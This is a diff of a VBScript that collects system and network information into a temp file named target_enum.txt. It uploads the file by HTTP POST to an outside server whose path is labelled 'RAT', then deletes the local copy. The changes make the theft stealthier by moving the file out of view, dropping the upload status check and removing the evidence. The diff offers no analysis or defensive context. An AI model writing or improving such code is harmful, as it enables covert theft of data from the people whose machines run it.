@@ -3,16 +3,13 @@ Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
 Set objWScriptShell = CreateObject("WScript.Shell")
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 Set objShell = CreateObject("WScript.Shell")
-strDesktopPath = objShell.SpecialFolders("Desktop") 
 
-' Create the file path
-strFilePath = strDesktopPath & "\details.txt"
+strTempPath = objWScriptShell.ExpandEnvironmentStrings("%TEMP%")
+strFilePath = strTempPath & "\target_enum.txt"
 
-' Create the text file
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-Set objFile = objFSO.CreateTextFile(strFilePath, True) 
+Set objFile = objFSO.CreateTextFile(strFilePath, True)
 
-' Function to read the file content
+' Function to read the file content and log the file path
 Function ReadFile(filePath)
     Dim fso, file, content
     Set fso = CreateObject("Scripting.FileSystemObject")
@@ -193,30 +190,23 @@ objFile.WriteLine http.responseText
 objFile.WriteLine
 Set http = Nothing
 
+objFile.Close
 
-' Upload the details.txt file
+' Upload the target_enum.txt file
 Dim filePath, url, xmlhttp, formData
-filePath = strDesktopPath & "\details.txt"
+filePath = strFilePath
 url = "https://arth.imbeddex.com/RAT/index.php"
-
-' Create XMLHTTP object
 Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 
 ' Open the connection
 xmlhttp.Open "POST", url, False
 
-' Create form data
-formData = "target_data.rat" & vbCrLf
+formData = "target_enum.rat" & vbCrLf
 formData = formData & ReadFile(filePath) & vbCrLf
 
 ' Send the request
 xmlhttp.send formData
 
-' Check the response
-If xmlhttp.Status = 200 Then
-    'MsgBox "File uploaded successfully!"
-Else
-    'MsgBox "Error uploading file: " & xmlhttp.Status & " - " & xmlhttp.statusText
-End If
+objFSO.DeleteFile strFilePath
 
-objFile.Close
+
